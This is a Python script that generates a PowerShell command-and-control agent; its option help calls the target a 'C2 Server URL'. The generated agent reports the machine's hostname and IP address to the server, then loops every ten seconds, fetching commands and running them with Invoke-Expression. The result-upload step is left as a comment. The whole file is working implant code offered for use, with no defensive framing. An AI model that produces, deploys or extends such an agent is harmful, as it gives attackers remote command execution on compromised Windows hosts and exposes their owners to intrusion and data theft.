#!/usr/bin/env python3

import argparse
import base64

def generate_powershell_agent(server_url):
    template = f"""
$serverUrl = "{server_url}"
$agentId = "$env:COMPUTERNAME-$([System.DateTime]::Now.Ticks)"

function Register-Agent {{
    $data = @{{
        agent_id = $agentId
        hostname = $env:COMPUTERNAME
        ip_address = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
    }} | ConvertTo-Json
    
    try {{
        $response = Invoke-WebRequest -Uri "$serverUrl/register" -Method Post -Body $data -ContentType "application/json" -UseBasicParsing
        return $response.Content | ConvertFrom-Json
    }} catch {{
        return $null
    }}
}}

function Get-Task {{
    param($token)
    $headers = @{{ Authorization = "Bearer $token" }}
    try {{
        $response = Invoke-WebRequest -Uri "$serverUrl/task/$agentId" -Method Get -Headers $headers -UseBasicParsing
        return $response.Content | ConvertFrom-Json
    }} catch {{
        return $null
    }}
}}

function Execute-Task {{
    param($task)
    if ($task.type -eq "command") {{
        try {{
            $output = Invoke-Expression $task.command 2>&1
            return @{{
                output = $output
                error = $null
                returncode = $LASTEXITCODE
            }}
        }} catch {{
            return @{{
                output = $null
                error = $_.Exception.Message
                returncode = 1
            }}
        }}
    }}
}}

# Main loop
$registration = Register-Agent
if ($registration) {{
    $token = $registration.token
    while ($true) {{
        $task = Get-Task -token $token
        if ($task -and $task.task) {{
            $result = Execute-Task -task $task.task
            # Send result back to server
        }}
        Start-Sleep -Seconds 10
    }}
}}
"""
    return template

def main():
    parser = argparse.ArgumentParser(description='Generate PowerShell agent script')
    parser.add_argument('--server-url', required=True, help='C2 Server URL')
    parser.add_argument('--output', help='Output file')
    args = parser.parse_args()
    
    script = generate_powershell_agent(args.server_url)
    
    if args.output:
        with open(args.output, 'w') as f:
            f.write(script)
        print(f"Script saved to {args.output}")
    else:
        print(script)

if __name__ == '__main__':
    main()
